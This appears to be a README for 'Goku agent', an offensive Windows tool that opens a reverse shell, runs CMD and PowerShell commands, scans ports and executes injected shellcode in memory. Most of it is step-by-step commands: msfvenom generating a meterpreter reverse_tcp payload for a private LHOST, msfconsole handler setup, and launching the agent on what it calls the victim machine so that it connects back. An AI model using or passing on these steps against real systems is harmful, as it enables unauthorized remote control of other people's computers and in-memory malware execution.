## Goku agent

Allows to spawn a reverse shell without using cmd.exe permanently.

the cmd.exe is launch only if you make a request to the agent. The request is then launched into a dedicated thread of the process.

There are several commands that you can use:

* CMD your command
* PSH your command
* SCAN tcp ip port1 port2 port3
* ASM bytecode
* PIPES_LS

That way you can launch a meterpreter directly into memory.

On your linux machine:
```
$ msfvenom -p windows/x64/meterpreter/reverse_tcp -a x64 LHOST=192.168.0.46 LPORT=4443 -f hex
$ sudo msfconsole
msf5> use windows/x64/shell_reverse_tcp
msf5> to_handler
```

On your windows machine:
```
$ .\goku_tcp -u 192.168.0.46 -p 4444
```

Then you can use the asm command to spawn a meterpreter on the victim machine.
